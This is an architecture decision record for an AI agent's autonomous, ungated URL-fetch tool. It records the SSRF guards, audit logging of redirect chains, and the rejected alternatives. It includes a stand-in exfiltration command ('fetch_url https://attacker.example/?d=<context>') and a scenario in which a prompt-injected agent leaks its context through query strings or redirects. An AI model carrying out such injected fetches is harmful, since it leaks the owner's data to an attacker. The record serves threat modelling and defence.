# ADR-0076 — `system.fetch_url` is an autonomous arbitrary-URL GET: SSRF-guarded at connect time, audited via the action_stagings row (incl. redirect chain), accepted exfil risk at single-user blast radius (BUILT — #286; extends ADR-0070/0071)

**Decision.** `system.fetch_url` reads any http(s) URL the boss already holds, **autonomously and ungated** — like `system.web_search`, `system.*` tools dispatch in autonomy mode and never await approval (ADR-0069's hard-confirm floor applies only to high-`riskTier` tools; this is `no_risk`). The posture is made explicit here rather than inherited by analogy, because the analogy is weaker than it looks: `web_search` only forwards a _query string_ to Google's server-side search — the destination is fixed — whereas `fetch_url` hands the caller a **fully caller-shaped outbound channel**. A prompt-injected boss could therefore `fetch_url https://attacker.example/?d=<context>` and exfiltrate. We accept that risk under four controls, none of which is "ask the user every time": **(1) SSRF is closed at the socket, not the string** — a custom undici `connect.lookup` resolves the host, rejects if _any_ resolved address is private/loopback/link-local/CGNAT/metadata (incl. IPv4-mapped/NAT64/6to4 forms), and pins the connection to the validated IP; redirects are followed _manually_, one re-validated hop at a time, so there is no DNS-rebinding TOCTOU window and no redirect into internal space (verified against undici 7.25.0). **(2) Honest read-in** (ADR-0071): textual content only, binary refused by magic-byte sniff, body streamed + torn down past 8MB, NUL-safe (ADR-0070). **(3) A complete audit trail**: every call writes an `action_stagings` row with the requested URL _and the full result_, now including the **redirect chain** (the ordered "from" URLs of each hop) — so an `innocuous.com → 302 → attacker.com` exfil hop is reconstructable, not hidden behind a lone `finalUrl`. **(4) Blast radius is the one owner**: single-user app, the only data reachable is the owner's own, and there is no cross-tenant amplification.

**Why.** The review of #286 correctly flagged that an autonomous, never-gated, arbitrary-destination GET is a real prompt-injection exfil channel, and that shipping it on `web_search`'s precedent _by analogy_ — without writing the posture down — leaves the risk-appetite call undocumented. This ADR records it as a deliberate, bounded acceptance: the destination-shaping difference from `web_search` is real, but at single-user scale the mitigations (connect-time SSRF pin + honest read-in + full audit row incl. redirect chain) are proportionate, and a per-call human gate on _reading a URL_ would make the tool nearly useless for the workflows it exists for ("read my website", "summarize this page"). The audit-trail gap the review found — redirect chain invisible — is closed in this batch (the chain rides the result onto the existing row).

**Alternatives.** (a) **Gate every fetch behind human approval** — rejected: kills the tool's purpose (autonomous reading is the point); the SSRF pin + audit row are the proportionate controls at this scale. (b) **Allowlist destinations** — rejected: the boss legitimately reads arbitrary user-supplied links; an allowlist defeats the use case and a denylist is the SSRF guard, which we already have at the socket. (c) **Per-run fetch fan-out cap** — _considered, deferred_: a bound on fetches-per-run would blunt a bulk-exfil loop, but it needs run-level mutable state the tool context doesn't yet carry (`ToolExecuteContext` has no run-scoped counter; same seam as the missing `abortSignal`), and at single-user blast radius the audit row already makes a bulk loop visible after the fact. Revisit if/when multi-user or untrusted-content ingestion raises the blast radius. (d) **Strip query/fragment from logged URLs** — rejected: the query string is exactly what an exfil channel encodes data into, so the audit row must keep it verbatim.

Sits beside ADR-0069 (the hard-confirm floor — which deliberately does _not_ reach `no_risk` `system.*` tools). The deferred per-run cap shares the `ToolExecuteContext`-has-no-run-scope seam with the deferred tool cancellation signal.
